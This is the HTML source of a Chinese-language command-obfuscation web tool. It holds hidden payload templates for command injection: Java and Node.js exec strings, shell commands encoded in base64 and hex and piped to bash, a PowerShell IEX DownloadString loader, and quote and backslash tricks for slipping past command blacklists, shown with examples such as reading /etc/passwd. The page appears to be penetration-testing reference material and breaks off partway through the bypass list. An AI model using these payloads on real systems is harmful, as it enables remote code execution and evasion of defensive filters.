<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <title>å‘½ä»¤å˜å½¢å·¥å…· - 1135</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <link rel="stylesheet" type="text/css" href="../../css/style.css">

    <style>
        body {
            display: grid;
            grid-template-rows: auto 1fr auto;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }

        .main-content {
            padding: 40px 20px;
            max-width: 1000px;
            margin: 0 auto;
        }

        .tool-header {
            text-align: center;
            margin-bottom: 40px;
            padding: 40px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            position: relative;
            overflow: hidden;
        }

        .tool-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: var(--primary-color);
            box-shadow: var(--shadow-glow);
        }

        .tool-header h1 {
            color: var(--primary-color);
            font-family: var(--font-mono);
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .tool-header p {
            color: var(--text-secondary);
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
        }

        .input-block {
            margin-bottom: 20px;
        }

        .form-label,
        .input-block label {
            display: block;
            margin-bottom: 8px;
            color: var(--primary-color);
            font-weight: bold;
            font-size: 0.9rem;
        }

        .form-control,
        .input-block input {
            width: 100%;
            padding: 12px 15px;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            font-family: var(--font-mono);
            font-size: 0.9rem;
            transition: all 0.3s ease;
            border-radius: 0;
        }

        /* Bold font for your_cmd input */
        #your_cmd {
            font-weight: bold;
        }

        .form-control:focus,
        .input-block input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: var(--shadow-glow);
        }

        /* Preset Commands Dropdown */
        .input-with-presets {
            display: flex;
            gap: 0;
        }

        .input-with-presets input {
            flex: 1;
            border-radius: 0;
            border-right: none;
        }

        .preset-btn {
            padding: 12px 15px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            color: var(--primary-color);
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s ease;
            border-radius: 0;
        }

        .preset-btn:hover {
            background: var(--primary-color);
            color: var(--bg-color);
        }

        .preset-menu {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-top: none;
            max-height: 400px;
            overflow-y: auto;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }

        .preset-category {
            padding: 10px 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .preset-category:last-child {
            border-bottom: none;
        }

        .preset-category strong {
            color: var(--primary-color);
            font-size: 0.85rem;
            display: block;
            margin-bottom: 8px;
        }

        .preset-item {
            padding: 8px 12px;
            margin: 4px 0;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            cursor: pointer;
            font-family: var(--font-mono);
            font-size: 0.8rem;
            color: var(--text-primary);
            transition: all 0.2s ease;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .preset-item:hover {
            border-color: var(--primary-color);
            background: rgba(0, 255, 65, 0.1);
            color: var(--primary-color);
        }

        .input-block {
            position: relative;
        }

        /* Environment Selector */
        .env-selector {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 15px;
            padding: 15px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
        }

        .env-selector-label {
            width: 100%;
            color: var(--primary-color);
            font-size: 0.85rem;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .env-chip {
            padding: 6px 14px;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            cursor: pointer;
            font-family: var(--font-mono);
            font-size: 0.8rem;
            color: var(--text-secondary);
            transition: all 0.2s ease;
            user-select: none;
        }

        .env-chip:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
        }

        .env-chip.active {
            background: var(--primary-color);
            border-color: var(--primary-color);
            color: #000;
            font-weight: bold;
        }

        .env-chip.active:hover {
            background: var(--primary-color);
            opacity: 0.9;
        }

        .env-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }

        .env-group-label {
            color: var(--text-secondary);
            font-size: 0.75rem;
            margin-right: 5px;
        }

        .env-divider {
            width: 1px;
            height: 24px;
            background: var(--border-color);
            margin: 0 8px;
        }

        textarea.form-control {
            min-height: 80px;
            max-height: 600px;
            overflow-y: auto;
            resize: vertical;
        }

        /* Code Output Blocks */
        .output-block {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            position: relative;
            transition: all 0.3s ease;
        }

        .output-block:hover {
            border-color: var(--primary-color);
            box-shadow: var(--shadow-glow);
        }

        .output-block h3 {
            color: var(--primary-color);
            font-size: 1rem;
            margin-bottom: 10px;
            font-family: var(--font-mono);
        }

        .output-block pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: var(--font-mono);
            font-size: 14px;
            color: var(--text-primary);
            max-height: 800px;
            overflow-y: auto;
        }

        .output-block code {
            font-family: inherit;
        }

        .copy-btn {
            padding: 4px 8px;
            background: var(--primary-color);
            color: var(--bg-color);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            margin-left: 8px;
            vertical-align: middle;
            transition: background 0.3s ease;
        }

        .copy-btn:hover {
            background: var(--primary-hover);
        }

        .code-with-copy {
            position: relative;
            margin: 8px 0;
        }

        /* Copy button inside code-with-copy: hidden by default, shown on hint-code hover */
        .code-with-copy .copy-btn {
            position: absolute;
            top: 5px;
            right: 5px;
            z-index: 10;
            opacity: 0;
            transition: opacity 0.3s ease, background 0.3s ease;
            pointer-events: auto;
            margin-left: 0;
            padding: 4px 8px;
            background: var(--primary-color);
            color: var(--bg-color);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
        }

        .code-with-copy .copy-btn:hover {
            background: var(--primary-hover);
        }

        .hint-code {
            position: relative;
            margin: 0;
        }

        .hint-section .hint-code {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 10px;
            margin: 8px 0;
            overflow-x: auto;
        }

        /* Hint sections styling */
        .hint-section {
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(0, 255, 65, 0.05);
            border-left: 3px solid var(--primary-color);
            border-radius: 4px;
        }

        /* Light theme hint section background */
        [data-theme="gray"] .hint-section {
            background: rgba(0, 0, 0, 0.03);
        }

        .hint-section strong {
            color: var(--primary-color);
            display: block;
            margin-bottom: 8px;
        }

        .hint-section p {
            color: var(--text-secondary);
            margin: 8px 0;
            line-height: 1.6;
        }

        /* Divider */
        hr {
            border: 0;
            height: 1px;
            background: var(--border-color);
            margin: 40px 0;
        }

        /* Hint Modal handled globally in style.css */

        .interactive-hint {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(5px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            animation: fadeIn 0.3s ease;
        }

        .interactive-hint.show {
            display: flex;
        }

        .hint-content {
            background: var(--surface-color);
            padding: 40px;
            border: 1px solid var(--primary-color);
            box-shadow: var(--shadow-glow);
            max-width: 800px;
            max-height: 85vh;
            overflow-y: auto;
            margin: 0 20px;
            text-align: left;
            position: relative;
        }

        .hint-content h3 {
            color: var(--primary-color);
            font-size: 1rem;
            margin-top: 20px;
            margin-bottom: 10px;
        }

        .hint-content code {
            background: rgba(0, 255, 65, 0.1);
            padding: 2px 6px;
            border-radius: 3px;
            font-family: var(--font-mono);
            color: var(--primary-color);
        }

        .hint-content::before {
            content: 'SYSTEM_MESSAGE';
            position: absolute;
            top: -10px;
            left: 20px;
            background: var(--surface-color);
            padding: 0 10px;
            color: var(--primary-color);
            font-size: 0.8rem;
        }

        .hint-content h2 {
            color: var(--primary-color);
            font-size: 1.5rem;
            margin-bottom: 20px;
            text-transform: uppercase;
        }

        .hint-content ul {
            text-align: left;
            color: var(--text-primary);
            margin-bottom: 30px;
            list-style: none;
        }

        .hint-content li::before {
            content: '> ';
            color: var(--primary-color);
        }

        .hint-close {
            background: transparent;
            color: var(--primary-color);
            border: 1px solid var(--primary-color);
            padding: 10px 30px;
            font-family: var(--font-mono);
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
        }

        .hint-close:hover {
            background: var(--primary-color);
            color: #000;
            box-shadow: var(--shadow-glow);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        /* Standardized Footer Overrides */
        .unified-footer {
            margin-top: 0 !important;
            padding: 1.5rem 0 !important;
            flex-shrink: 0;
            background: var(--surface-color) !important;
            border-top: 1px solid var(--border-color) !important;
        }
    </style>
</head>

<body>
    <!-- å¯¼èˆªæ  -->
    <div id="navigation-container"></div>
    <script>
        // Load Navigation synchronously to prevent page flash/jitter
        (function () {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '../../navigation.html', false); // Synchronous to prevent flash
            try {
                xhr.send();
                if (xhr.status === 200 || xhr.status === 0) { // 0 for file:// protocol
                    const container = document.getElementById('navigation-container');
                    container.innerHTML = xhr.responseText;

                    // Manually execute scripts
                    const scripts = container.querySelectorAll('script');
                    scripts.forEach(oldScript => {
                        const newScript = document.createElement('script');
                        Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
                        newScript.textContent = oldScript.textContent;
                        document.body.appendChild(newScript);
                    });
                }
            } catch (e) {
                console.error('Failed to load navigation:', e);
            }
        })();
    </script>

    <!-- ä¸»è¦å†…å®¹ -->
    <main class="main-content">

        <!-- payloads template (Hidden) -->
        <textarea id="data0" hidden="true">arr0w1_cmd_origin</textarea>

        <!-- 1. Java Runtime.exec() - String[] -->
        <textarea id="data1" hidden="true">
ğŸ”¥[Java] [Linux/macOS] /bin/sh -c
ğŸ“Œå‰æ: Javaç¯å¢ƒ, /bin/shå¯ç”¨
ğŸ“ŒæˆåŠŸç‡é«˜, æ”¯æŒç‰¹æ®Šå­—ç¬¦
ğŸ“Œå›æ˜¾: âŒæ—  (exec()è¿”å›Processå¯¹è±¡, éœ€è¯»å–getInputStream()è·å–è¾“å‡º)
java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_origin"});
ğŸ”¥[Java] [Linux] /bin/bash -c
ğŸ“Œå‰æ: Javaç¯å¢ƒ, /bin/bashå¯ç”¨
ğŸ“ŒæˆåŠŸç‡é«˜, æ”¯æŒBashç‰¹æ€§
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","arr0w1_cmd_origin"});
ğŸ”¥[Java] [Windows] cmd.exe /c
ğŸ“Œå‰æ: Javaç¯å¢ƒ, Windowsç³»ç»Ÿ
ğŸ“Œæ‰§è¡Œåå…³é—­cmdçª—å£
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
java.lang.Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","arr0w1_cmd_origin"});
ğŸ”¥[Java] [Windows] PowerShell -c
ğŸ“Œå‰æ: Javaç¯å¢ƒ, PowerShellå¯ç”¨
ğŸ“Œæ”¯æŒæ›´å¤æ‚çš„å‘½ä»¤
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
java.lang.Runtime.getRuntime().exec(new String[]{"powershell.exe","-c","arr0w1_cmd_origin"});
</textarea>

        <!-- 2. Java Runtime.exec() - String (Base64 encoded) -->
        <textarea id="data2" hidden="true">
ğŸ”¥[Java] [Linux] Brace expansion + Base64
ğŸ“Œç”¨é€”: Runtime.exec(String) å•å­—ç¬¦ä¸²å‚æ•°
ğŸ“Œå‰æ: Javaç¯å¢ƒ, /bin/bashå¯ç”¨, base64å‘½ä»¤å­˜åœ¨
ğŸ“Œæ³¨æ„: Linuxç”¨ -d, å¿…é¡»é€šè¿‡bashæ‰§è¡Œ(zshä¸æ”¯æŒ)
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
/bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash
ğŸ”¥[Java] [macOS] Brace expansion + Base64
ğŸ“Œç”¨é€”: Runtime.exec(String) å•å­—ç¬¦ä¸²å‚æ•°
ğŸ“Œå‰æ: Javaç¯å¢ƒ, /bin/bashå¯ç”¨, base64å‘½ä»¤å­˜åœ¨
ğŸ“Œæ³¨æ„: macOSç”¨ -D (å¤§å†™), å¿…é¡»é€šè¿‡bashæ‰§è¡Œ(zshä¸æ”¯æŒ)
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
/bin/bash -c {echo,arr0w1_base64}|{base64,-D}|bash
ğŸ”¥[Java] [Linux] $@ expansion
ğŸ“Œç”¨é€”: Runtime.exec(String) å•å­—ç¬¦ä¸²å‚æ•°
ğŸ“Œå‰æ: Javaç¯å¢ƒ, bashå¯ç”¨
ğŸ“Œæ³¨æ„: å‘½ä»¤ä¸­ä¸èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ (){}[]<>|&;
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
/bin/bash -c $@|bash 0 echo arr0w1_cmd_origin
ğŸ”¥[Java] [Linux] $* expansion
ğŸ“Œç”¨é€”: Runtime.exec(String) å•å­—ç¬¦ä¸²å‚æ•°
ğŸ“Œå‰æ: Javaç¯å¢ƒ, bashå¯ç”¨
ğŸ“Œæ³¨æ„: å‘½ä»¤ä¸­ä¸èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ (){}[]<>|&;
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
/bin/bash -c $*|bash 0 echo arr0w1_cmd_origin
ğŸ”¥[Java] [Linux] $0 here-string
ğŸ“Œç”¨é€”: Runtime.exec(String) å•å­—ç¬¦ä¸²å‚æ•°
ğŸ“Œå‰æ: Javaç¯å¢ƒ, bashå¯ç”¨
ğŸ“Œä½¿ç”¨here-stringä¼ é€’å‘½ä»¤
ğŸ“Œå›æ˜¾: âŒæ—  (éœ€è¯»å–Process.getInputStream())
/bin/bash -c $0<<<arr0w1_cmd_origin bash
</textarea>

        <!-- 3. Shell Encoding (Base64/Hex/Obfuscation) - ç›´æ¥åœ¨ç»ˆç«¯æ‰§è¡Œ -->
        <textarea id="data3" hidden="true">
ğŸ”¥[Shell] [Linux] Base64 - Brace expansion (Bash Only)
ğŸ“Œç”¨é€”: åœ¨Bashç»ˆç«¯æ‰§è¡Œ, zshä¸æ”¯æŒæ­¤è¯­æ³•!
ğŸ“Œå‰æ: bash, base64å‘½ä»¤
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
{echo,arr0w1_base64}|{base64,-d}|bash
ğŸ”¥[Shell] [macOS] Base64 - Brace expansion (Bash Only)
ğŸ“Œç”¨é€”: åœ¨Bashç»ˆç«¯æ‰§è¡Œ, zshä¸æ”¯æŒæ­¤è¯­æ³•!
ğŸ“Œå‰æ: bash, base64å‘½ä»¤, macOSç”¨ -D
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
{echo,arr0w1_base64}|{base64,-D}|bash
ğŸ”¥[Shell] [Linux] Base64 - echo + pipe
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ
ğŸ“Œå‰æ: bash/zsh, base64å‘½ä»¤
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
echo 'arr0w1_base64'|base64 -d|bash
ğŸ”¥[Shell] [macOS] Base64 - echo + pipe
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ
ğŸ“Œå‰æ: bash/zsh, base64å‘½ä»¤, macOSç”¨ -D
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
echo 'arr0w1_base64'|base64 -D|bash
ğŸ”¥[Shell] [Linux] Base64 - bash -c wrapper
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ, æˆ–ä½œä¸ºå‚æ•°ä¼ é€’
ğŸ“Œå‰æ: bash, base64å‘½ä»¤
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
bash -c 'echo arr0w1_base64|base64 -d|bash'
ğŸ”¥[Shell] [macOS] Base64 - bash -c wrapper
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ, æˆ–ä½œä¸ºå‚æ•°ä¼ é€’
ğŸ“Œå‰æ: bash, base64å‘½ä»¤, macOSç”¨ -D
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
bash -c 'echo arr0w1_base64|base64 -D|bash'
ğŸ”¥[Shell] [Linux/macOS] Base64 - Perl
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ
ğŸ“Œå‰æ: perl, MIME::Base64æ¨¡å—
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'
ğŸ”¥[Shell] [Linux/macOS] Base64 - Python3
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ
ğŸ“Œå‰æ: python3
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
python3 -c "import base64,os;os.system(base64.b64decode('arr0w1_base64').decode())"
ğŸ”¥[Shell] [Linux/macOS] Hex - echo|bash (æ¨è)
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ
ğŸ“Œå‰æ: bash/zsh, echo -eæ”¯æŒ
ğŸ“Œä¼˜åŠ¿: æ”¯æŒ | & ; && || ç­‰æ‰€æœ‰shellè¯­æ³•
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
echo -e "arr0w1_hex_full"|bash
ğŸ”¥[Shell] [Linux/macOS] Hex - eval (æ¨è)
ğŸ“Œç”¨é€”: ç›´æ¥åœ¨ç»ˆç«¯/Shellæ‰§è¡Œ
ğŸ“Œå‰æ: bash/zsh
ğŸ“Œä¼˜åŠ¿: æ”¯æŒ | & ; && || ç­‰æ‰€æœ‰shellè¯­æ³•
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
eval $(echo -e "arr0w1_hex_full")
</textarea>

        <!-- 4. Node.js child_process -->
        <textarea id="data4" hidden="true">
ğŸ”¥[Node.js] [Linux/macOS/Windows] require() - Direct
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ
ğŸ“Œæœ€ç®€å•çš„æ–¹å¼, å¼‚æ­¥æ‰§è¡Œ
ğŸ“Œå›æ˜¾: âŒæ—  (execæ˜¯å¼‚æ­¥çš„, éœ€è¦callbackè·å–è¾“å‡º)
require('child_process').exec('arr0w1_cmd_origin');//
ğŸ”¥[Node.js] [Linux/macOS/Windows] require() - Hex module name
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ
ğŸ“Œç»•è¿‡ "child_process" å­—ç¬¦ä¸²è¿‡æ»¤
ğŸ“Œå›æ˜¾: âŒæ—  (å¼‚æ­¥æ‰§è¡Œ, éœ€callback)
require('\x63hild_process').exec('arr0w1_cmd_origin');//
ğŸ”¥[Node.js] [Linux/macOS/Windows] require() - Unicode + Hex command
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ
ğŸ“Œç»•è¿‡æ¨¡å—åå’Œå‘½ä»¤çš„å­—ç¬¦ä¸²è¿‡æ»¤
ğŸ“Œå›æ˜¾: âŒæ—  (å¼‚æ­¥æ‰§è¡Œ, éœ€callback)
require('\u0063hild_process').exec('arr0w1_cmd_ascii2hex');//
ğŸ”¥[Node.js] [Linux/macOS/Windows] require() - Base64 command
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ
ğŸ“Œç»•è¿‡å‘½ä»¤å†…å®¹è¿‡æ»¤
ğŸ“Œå›æ˜¾: âŒæ—  (å¼‚æ­¥æ‰§è¡Œ, éœ€callback)
require('child_process').exec(Buffer.from('arr0w1_base64','base64').toString());//
ğŸ”¥[Node.js] [Linux/macOS/Windows] execSync - Synchronous
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ
ğŸ“ŒåŒæ­¥æ‰§è¡Œ, å¯è·å–è¾“å‡º
ğŸ“Œå›æ˜¾: âœ…æœ‰ (è¿”å›Buffer, .toString()è½¬å­—ç¬¦ä¸²)
require('child_process').execSync('arr0w1_cmd_origin').toString();//
ğŸ”¥[Node.js] [Linux/macOS] spawnSync - /bin/sh
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ, /bin/shå¯ç”¨
ğŸ“Œæ›´åº•å±‚çš„è¿›ç¨‹æ§åˆ¶
ğŸ“Œå›æ˜¾: âœ…æœ‰ (stdoutå±æ€§åŒ…å«è¾“å‡º)
require('child_process').spawnSync('/bin/sh',['-c','arr0w1_cmd_origin']).stdout.toString();//
ğŸ”¥[Node.js] [Windows] spawnSync - cmd.exe
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ, Windowsç³»ç»Ÿ
ğŸ“Œæ›´åº•å±‚çš„è¿›ç¨‹æ§åˆ¶
ğŸ“Œå›æ˜¾: âœ…æœ‰ (stdoutå±æ€§åŒ…å«è¾“å‡º)
require('child_process').spawnSync('cmd.exe',['/c','arr0w1_cmd_origin']).stdout.toString();//
ğŸ”¥[Node.js] [Linux/macOS/Windows] global.process.mainModule
ğŸ“Œå‰æ: Node.jsç¯å¢ƒ
ğŸ“Œç»•è¿‡ç›´æ¥requireçš„é™åˆ¶
ğŸ“Œå›æ˜¾: âŒæ—  (å¼‚æ­¥æ‰§è¡Œ, éœ€callback)
global.process.mainModule.require('child_process').exec('arr0w1_cmd_origin');//
</textarea>

        <!-- 5. PowerShell / cmd.exe -->
        <textarea id="data5" hidden="true">
ğŸ”¥[Shell] [Windows] PowerShell - Direct
ğŸ“Œå‰æ: PowerShellå¯ç”¨
ğŸ“ŒåŸºæœ¬æ‰§è¡Œæ–¹å¼
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
powershell -c "arr0w1_cmd_origin"
ğŸ”¥[Shell] [Windows] PowerShell - EncodedCommand
ğŸ“Œå‰æ: PowerShellå¯ç”¨
ğŸ“ŒBase64ç¼–ç (UTF-16LE), ç»•è¿‡ç‰¹æ®Šå­—ç¬¦
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
powershell -enc arr0w1_base64_utf16
ğŸ”¥[Shell] [Windows] PowerShell - IEX DownloadString
ğŸ“Œå‰æ: PowerShellå¯ç”¨, ç½‘ç»œè®¿é—®
ğŸ“Œè¿œç¨‹åŠ è½½è„šæœ¬, è¾“å…¥åº”ä¸ºURL
ğŸ“Œå›æ˜¾: âœ…æœ‰ (æ‰§è¡Œä¸‹è½½è„šæœ¬çš„è¾“å‡º)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('arr0w1_cmd_origin')"
ğŸ”¥[Shell] [Windows] PowerShell - Bypass ExecutionPolicy
ğŸ“Œå‰æ: PowerShellå¯ç”¨
ğŸ“Œç»•è¿‡è„šæœ¬æ‰§è¡Œç­–ç•¥é™åˆ¶
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
powershell -ep bypass -c "arr0w1_cmd_origin"
ğŸ”¥[Shell] [Windows] cmd.exe /c
ğŸ“Œå‰æ: Windowsç³»ç»Ÿ
ğŸ“Œæ‰§è¡Œåå…³é—­çª—å£
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
cmd /c arr0w1_cmd_origin
ğŸ”¥[Shell] [Windows] cmd.exe /k
ğŸ“Œå‰æ: Windowsç³»ç»Ÿ
ğŸ“Œæ‰§è¡Œåä¿æŒçª—å£æ‰“å¼€
ğŸ“Œå›æ˜¾: âœ…æœ‰ (ç»ˆç«¯ç›´æ¥æ˜¾ç¤ºè¾“å‡º)
cmd /k arr0w1_cmd_origin
</textarea>

        <!-- 6. Filter Bypass Techniques - Based on PayloadsAllTheThings -->
        <textarea id="data6" hidden="true">
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ“Œå›æ˜¾è¯´æ˜: ä»¥ä¸‹BypassæŠ€æœ¯å‡åœ¨Shellä¸­ç›´æ¥æ‰§è¡Œ
ğŸ“Œç»ˆç«¯æ‰§è¡Œæ—¶ âœ…æœ‰å›æ˜¾, æ¼æ´æ³¨å…¥æ—¶å–å†³äºåº”ç”¨æ˜¯å¦è¿”å›stdout
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¶ å‘½ä»¤åç»•è¿‡ (Bypass Command Blacklist)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
ğŸ”¥[Shell] [Linux/macOS] Single Quote - ç©ºå¼•å·æ’å…¥
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå• (å¦‚è¿‡æ»¤ cat, whoami ç­‰)
ğŸ“ŒåŸç†: ç©ºå•å¼•å·è¢«shellå¿½ç•¥, wh''oami = whoami
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ c''at /etc/passwd
arr0w1_sq_empty
ğŸ”¥[Shell] [Linux/macOS] Single Quote - å¼•å·åŒ…è£¹å¼€å¤´
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: 'wh'oami ä¸­ 'wh' è¢«åŸæ ·è¾“å‡ºåæ‹¼æ¥
ğŸ“Œç¤ºä¾‹: whoami â†’ 'who'ami
arr0w1_sq_wrap_start
ğŸ”¥[Shell] [Linux/macOS] Single Quote - å¼•å·åŒ…è£¹ä¸­é—´
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: å•å¼•å·å¯åŒ…è£¹å‘½ä»¤ä»»æ„éƒ¨åˆ†
ğŸ“Œç¤ºä¾‹: whoami â†’ w'hoa'mi
arr0w1_sq_wrap_mid
ğŸ”¥[Shell] [Linux/macOS] Double Quote - ç©ºå¼•å·æ’å…¥
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: ç©ºåŒå¼•å·è¢«shellå¿½ç•¥, wh""oami = whoami
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ c""at /etc/passwd
arr0w1_dq_empty
ğŸ”¥[Shell] [Linux/macOS] Double Quote - å¼•å·åŒ…è£¹å¼€å¤´
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: "wh"oami ä¸­ "wh" è¢«åŸæ ·è¾“å‡ºåæ‹¼æ¥
ğŸ“Œç¤ºä¾‹: whoami â†’ "who"ami
arr0w1_dq_wrap_start
ğŸ”¥[Shell] [Linux/macOS] Double Quote - å¼•å·åŒ…è£¹ä¸­é—´
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: åŒå¼•å·å¯åŒ…è£¹å‘½ä»¤ä»»æ„éƒ¨åˆ†
ğŸ“Œç¤ºä¾‹: whoami â†’ w"hoa"mi
arr0w1_dq_wrap_mid
ğŸ”¥[Shell] [Linux/macOS] Backslash - å•ä¸ªåæ–œæ 
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå•
ğŸ“ŒåŸç†: åæ–œæ è½¬ä¹‰æ™®é€šå­—ç¬¦ä¸æ”¹å˜å…¶å€¼, w\hoami = whoami
ğŸ“Œç¤ºä¾‹: cat /etc/passwd â†’ c\at /etc/passwd
arr0w1_bs_single
ğŸ”¥[Shell] [Linux/macOS] Backslash - å…¨å­—ç¬¦åæ–œæ 
ğŸ“Œç»•è¿‡: å‘½ä»¤å…³é”®å­—é»‘åå• (å¼ºåŠ›æ··æ·†)
